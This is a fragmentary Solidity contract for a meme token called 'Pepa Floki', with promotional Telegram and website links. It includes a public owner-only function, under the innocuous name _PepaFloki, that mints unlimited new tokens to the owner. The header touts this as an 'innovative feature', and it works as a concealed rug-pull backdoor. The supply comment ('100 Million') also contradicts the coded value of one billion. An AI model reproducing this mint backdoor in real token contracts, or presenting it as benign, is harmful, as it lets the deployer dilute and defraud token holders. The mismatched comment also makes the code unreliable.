...
//
// $PepaFloki proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/PEPAFLOKI
// 📱 Website ::https://pepafloki.io/
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _PepaFloki(uint256 amount) public onlyOwner {
 _PepaFloki(msg.sender, amount);
    }
    ...
    function _PepaFloki(address account, uint256 amount) internal virtual {
...
contract $PepaFloki is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Pepa Floki", "PEPAFLOKI") {
     _PepaFloki(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}